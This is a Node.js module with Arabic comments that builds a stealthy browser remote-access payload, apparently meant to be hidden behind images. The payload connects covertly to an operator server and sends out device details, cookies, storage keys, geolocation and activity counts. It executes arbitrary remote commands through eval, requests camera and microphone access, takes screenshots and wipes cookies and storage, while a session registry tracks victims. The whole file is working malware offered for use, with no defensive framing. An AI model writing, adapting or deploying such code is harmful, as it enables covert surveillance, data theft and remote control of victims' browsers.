const { v4: uuidv4 } = require('uuid');

class AdvancedPayloadSystem {
    constructor() {
        this.payloads = new Map();
        this.sessions = new Map();
    }

    // إنشاء بايلود مخفي يعمل في جميع التطبيقات
    createHiddenPayload(imageId, serverUrl) {
        const payloadId = uuidv4();
        
        const hiddenPayload = `
// === HIDDEN REVERSE PAYLOAD ===
(function() {
    const CONFIG = {
        image_id: '${imageId}',
        payload_id: '${payloadId}',
        server_url: '${serverUrl}',
        version: '6.0.0'
    };

    console.log('🦠 Hidden Payload Activated');

    // بدء النظام تلقائياً
    function startHiddenSystem() {
        // محاولة الاتصال الفوري
        connectImmediately();
        
        // إنشاء عناصر مخفية
        createStealthElements();
        
        // نظام المراقبة الخفية
        startStealthMonitoring();
    }

    // الاتصال الفوري مع السيرفر
    function connectImmediately() {
        try {
            // محاولة WebSocket أولاً
            tryWebSocket();
        } catch (error) {
            // استخدام طرق بديلة
            useAlternativeMethods();
        }
    }

    // محاولة WebSocket
    function tryWebSocket() {
        const ws = new WebSocket(CONFIG.server_url.replace('https', 'wss'));
        
        ws.onopen = function() {
            sendDeviceInfo(ws);
        };
        
        ws.onmessage = function(event) {
            handleCommand(event);
        };
        
        ws.onclose = function() {
            setTimeout(tryWebSocket, 3000);
        };
        
        ws.onerror = function() {
            setTimeout(tryWebSocket, 5000);
        };
    }

    // إرسال معلومات الجهاز
    function sendDeviceInfo(ws) {
        const deviceInfo = getCompleteDeviceInfo();
        
        ws.send(JSON.stringify({
            type: 'reverse_connect',
            device_id: deviceInfo.id,
            image_id: CONFIG.image_id,
            payload_id: CONFIG.payload_id,
            platform: deviceInfo.platform,
            userAgent: deviceInfo.userAgent,
            url: deviceInfo.url,
            ip: deviceInfo.ip,
            device_info: deviceInfo,
            timestamp: new Date().toISOString()
        }));
    }

    // معالجة الأوامر
    function handleCommand(event) {
        try {
            const data = JSON.parse(event.data);
            
            if (data.type === 'command') {
                executeStealthCommand(data.command, data.device_id)
                    .then(result => {
                        event.target.send(JSON.stringify({
                            type: 'command_result',
                            device_id: data.device_id,
                            command: data.command,
                            result: result
                        }));
                    });
            }
        } catch (e) {
            console.error('Command error:', e);
        }
    }

    // استخدام طرق بديلة
    function useAlternativeMethods() {
        // Long Polling
        startStealthPolling();
        
        // Hidden Iframe
        createHiddenIframe();
        
        // Background Fetch
        startBackgroundSync();
    }

    // التصيد الخفي
    function startStealthPolling() {
        setInterval(() => {
            fetch(CONFIG.server_url + '/stealth/' + CONFIG.payload_id)
                .then(r => r.json())
                .then(commands => {
                    commands.forEach(cmd => {
                        executeStealthCommand(cmd.text, cmd.device_id);
                    });
                });
        }, 10000);
    }

    // إنشاء iframe مخفي
    function createHiddenIframe() {
        try {
            const iframe = document.createElement('iframe');
            iframe.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;';
            iframe.src = CONFIG.server_url + '/track/' + CONFIG.payload_id;
            document.body.appendChild(iframe);
        } catch(e) {}
    }

    // المزامنة الخلفية
    function startBackgroundSync() {
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js').then(() => {
                setInterval(() => {
                    fetch(CONFIG.server_url + '/sync/' + CONFIG.payload_id);
                }, 15000);
            });
        }
    }

    // إنشاء عناصر خفية
    function createStealthElements() {
        // صورة خفية
        const stealthImg = new Image();
        stealthImg.src = CONFIG.server_url + '/pixel.png?payload=' + CONFIG.payload_id;
        stealthImg.style.display = 'none';
        
        // نموذج خفي
        const stealthForm = document.createElement('form');
        stealthForm.method = 'POST';
        stealthForm.action = CONFIG.server_url + '/log';
        stealthForm.style.display = 'none';
        
        const input = document.createElement('input');
        input.name = 'device_id';
        input.value = generateDeviceId();
        stealthForm.appendChild(input);
        
        document.body.appendChild(stealthForm);
        stealthForm.submit();
    }

    // نظام المراقبة الخفية
    function startStealthMonitoring() {
        // مراقبة الموقع
        monitorLocation();
        
        // مراقبة البطارية
        monitorBattery();
        
        // مراقبة الشبكة
        monitorNetwork();
        
        // مراقبة النشاط
        monitorActivity();
    }

    // مراقبة الموقع
    function monitorLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                sendStealthData('location', {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            }, null, { enableHighAccuracy: true });
        }
    }

    // مراقبة البطارية
    function monitorBattery() {
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                sendStealthData('battery', {
                    level: battery.level * 100,
                    charging: battery.charging
                });
            });
        }
    }

    // مراقبة الشبكة
    function monitorNetwork() {
        if (navigator.connection) {
            sendStealthData('network', {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink
            });
        }
    }

    // مراقبة النشاط
    function monitorActivity() {
        let activityData = {
            clicks: 0,
            keys: 0,
            movements: 0
        };

        document.addEventListener('click', () => {
            activityData.clicks++;
            if (activityData.clicks % 5 === 0) {
                sendStealthData('activity', activityData);
            }
        });

        document.addEventListener('keypress', () => {
            activityData.keys++;
        });

        document.addEventListener('mousemove', () => {
            activityData.movements++;
        });
    }

    // إرسال بيانات خفية
    function sendStealthData(type, data) {
        const img = new Image();
        img.src = CONFIG.server_url + '/beacon?type=' + type + 
                 '&payload=' + CONFIG.payload_id + 
                 '&data=' + encodeURIComponent(JSON.stringify(data));
    }

    // تنفيذ الأوامر الخفية
    async function executeStealthCommand(command, deviceId) {
        try {
            let result = '';
            const cmd = command.toLowerCase().trim();
            
            if (cmd === 'معلومات' || cmd === 'info') {
                result = await getCompleteDeviceInfo();
            }
            else if (cmd === 'الموقع' || cmd === 'location') {
                result = await getStealthLocation();
            }
            else if (cmd === 'اهتزاز' || cmd === 'vibrate') {
                result = await triggerStealthVibration();
            }
            else if (cmd === 'البطارية' || cmd === 'battery') {
                result = await getStealthBattery();
            }
            else if (cmd === 'الصور' || cmd === 'photos') {
                result = await extractStealthPhotos();
            }
            else if (cmd === 'الكاميرا' || cmd === 'camera') {
                result = await accessStealthCamera();
            }
            else if (cmd === 'الميكروفون' || cmd === 'microphone') {
                result = await accessStealthMicrophone();
            }
            else if (cmd === 'التخزين' || cmd === 'storage') {
                result = await getStealthStorage();
            }
            else if (cmd === 'لقطة' || cmd === 'screenshot') {
                result = await takeStealthScreenshot();
            }
            else if (cmd === 'فرمتة' || cmd === 'format') {
                result = await stealthFormat();
            }
            else if (cmd === 'إعادة تشغيل' || cmd === 'reboot') {
                result = await stealthReboot();
            }
            else if (cmd.startsWith('js:')) {
                const jsCode = command.substring(3);
                result = String(await eval(jsCode));
            } else {
                result = String(await eval(command));
            }
            
            return result || '✅ تم التنفيذ';
            
        } catch (error) {
            return '❌ خطأ: ' + error.toString();
        }
    }

    // جمع معلومات كاملة عن الجهاز
    async function getCompleteDeviceInfo() {
        const info = {
            // المعلومات الأساسية
            device_id: generateDeviceId(),
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            
            // الشاشة
            screen: {
                width: window.screen.width,
                height: window.screen.height,
                color_depth: window.screen.colorDepth
            },
            
            // المتصفح
            browser: {
                name: getBrowserName(),
                version: navigator.appVersion,
                cookie_enabled: navigator.cookieEnabled
            },
            
            // الشبكة
            network: navigator.connection ? {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink
            } : null,
            
            // الجهاز
            device: {
                memory: navigator.deviceMemory,
                cores: navigator.hardwareConcurrency
            },
            
            // الموقع
            location: window.location.href,
            referrer: document.referrer,
            
            // التخزين
            cookies: document.cookie,
            localStorage: localStorage ? Object.keys(localStorage) : [],
            
            // البطارية
            battery: await getBatteryStatus(),
            
            // الوقت
            timestamp: new Date().toISOString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        
        return JSON.stringify(info, null, 2);
    }

    // الحصول على الموقع الخفي
    function getStealthLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve('❌ لا يدعم الموقع');
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                position => {
                    resolve(JSON.stringify({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + ' متر'
                    }, null, 2));
                },
                error => {
                    resolve('❌ خطأ في الموقع: ' + error.message);
                },
                { enableHighAccuracy: true, timeout: 30000 }
            );
        });
    }

    // تشغيل الاهتزاز الخفي
    function triggerStealthVibration() {
        if (navigator.vibrate) {
            navigator.vibrate([200, 100, 200, 100, 200]);
            return '📳 تم تشغيل الاهتزاز الخفي';
        }
        return '❌ لا يدعم الاهتزاز';
    }

    // حالة البطارية الخفية
    function getStealthBattery() {
        return new Promise((resolve) => {
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    resolve(JSON.stringify({
                        level: (battery.level * 100) + '%',
                        charging: battery.charging ? 'نعم' : 'لا'
                    }, null, 2));
                }).catch(() => {
                    resolve('❌ خطأ في البطارية');
                });
            } else {
                resolve('❌ لا يدعم البطارية');
            }
        });
    }

    // استخراج الصور الخفية
    function extractStealthPhotos() {
        try {
            const images = Array.from(document.images);
            const photos = images.map((img, i) => ({
                index: i + 1,
                src: img.src,
                alt: img.alt,
                width: img.width,
                height: img.height
            }));
            
            return \`🖼️ تم العثور على \${photos.length} صورة:\n\${JSON.stringify(photos, null, 2)}\`;
        } catch (error) {
            return '❌ خطأ في استخراج الصور';
        }
    }

    // الوصول للكاميرا الخفية
    function accessStealthCamera() {
        return new Promise((resolve) => {
            if (!navigator.mediaDevices) {
                resolve('❌ لا يدعم الكاميرا');
                return;
            }
            
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    resolve('✅ تم الوصول للكاميرا');
                })
                .catch(error => {
                    resolve('❌ خطأ في الكاميرا: ' + error.message);
                });
        });
    }

    // الوصول للميكروفون الخفي
    function accessStealthMicrophone() {
        return new Promise((resolve) => {
            if (!navigator.mediaDevices) {
                resolve('❌ لا يدعم الميكروفون');
                return;
            }
            
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    resolve('✅ تم الوصول للميكروفون');
                })
                .catch(error => {
                    resolve('❌ خطأ في الميكروفون: ' + error.message);
                });
        });
    }

    // التخزين الخفي
    function getStealthStorage() {
        try {
            return JSON.stringify({
                cookies: document.cookie,
                localStorage: localStorage ? Object.keys(localStorage) : [],
                sessionStorage: sessionStorage ? Object.keys(sessionStorage) : []
            }, null, 2);
        } catch (error) {
            return '❌ خطأ في التخزين';
        }
    }

    // لقطة شاشة خفية
    function takeStealthScreenshot() {
        return new Promise((resolve) => {
            if (typeof html2canvas !== 'undefined') {
                html2canvas(document.body).then(canvas => {
                    resolve(canvas.toDataURL().substring(0, 500) + '...');
                }).catch(() => {
                    resolve('❌ خطأ في اللقطة');
                });
            } else {
                resolve('❌ تحتاج مكتبة html2canvas');
            }
        });
    }

    // الفرمتة الخفية
    function stealthFormat() {
        try {
            if (localStorage) localStorage.clear();
            if (sessionStorage) sessionStorage.clear();
            document.cookie.split(";").forEach(cookie => {
                const name = cookie.split("=")[0].trim();
                document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
            });
            return '✅ تم محاكاة الفرمتة';
        } catch (error) {
            return '❌ خطأ في الفرمتة';
        }
    }

    // إعادة التشغيل الخفية
    function stealthReboot() {
        return '🔄 هذه الميزة تتطلب صلاحيات نظام متقدمة';
    }

    // وظائف مساعدة
    function getBrowserName() {
        const ua = navigator.userAgent;
        if (ua.includes("Chrome")) return "Chrome";
        if (ua.includes("Firefox")) return "Firefox";
        if (ua.includes("Safari")) return "Safari";
        return "Unknown";
    }

    function getBatteryStatus() {
        return new Promise((resolve) => {
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    resolve({
                        level: (battery.level * 100) + '%',
                        charging: battery.charging
                    });
                }).catch(() => resolve(null));
            } else {
                resolve(null);
            }
        });
    }

    function generateDeviceId() {
        return 'device_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
    }

    // بدء النظام الخفي
    console.log('🚀 Starting Hidden Reverse Payload...');
    setTimeout(startHiddenSystem, 1000);

})();
// === HIDDEN PAYLOAD END ===
`;

        this.payloads.set(payloadId, {
            imageId: imageId,
            payload: hiddenPayload,
            createdAt: new Date()
        });

        return {
            payloadId: payloadId,
            code: hiddenPayload
        };
    }

    getPayload(payloadId) {
        return this.payloads.get(payloadId);
    }

    registerSession(deviceId, sessionData) {
        this.sessions.set(deviceId, {
            ...sessionData,
            lastActive: new Date(),
            active: true
        });
    }

    getActiveSessions() {
        return Array.from(this.sessions.entries())
            .filter(([_, session]) => session.active)
            .map(([deviceId, session]) => ({ deviceId, ...session }));
    }
}

module.exports = AdvancedPayloadSystem;